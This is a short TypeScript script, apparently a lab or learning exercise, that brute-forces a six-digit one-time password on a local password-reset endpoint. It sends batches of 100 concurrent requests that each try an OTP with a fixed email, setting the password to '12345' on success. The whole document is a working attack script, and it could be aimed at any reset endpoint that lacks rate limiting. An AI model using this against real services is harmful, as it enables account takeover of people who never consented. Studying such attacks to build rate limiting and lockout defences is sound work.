import axios from 'axios';

async function sendRequest(otp:string){
    try {
        const response = await axios.post('http://localhost:3000/reset-password', {
            email:"random@gmail.com", otp, newPassword:"12345"
        });

        console.log(response.data);
    } catch (error) {
        console.error
    }
}



async function main() {
    for(let i=100000; i<999999; i+=100){
        let p = [];
        console.log(i)
      for(let j = 0; j < 100; j++){
        p.push(sendRequest((i+j).toString()));
      }
      await Promise.all(p)
    }
}

main();
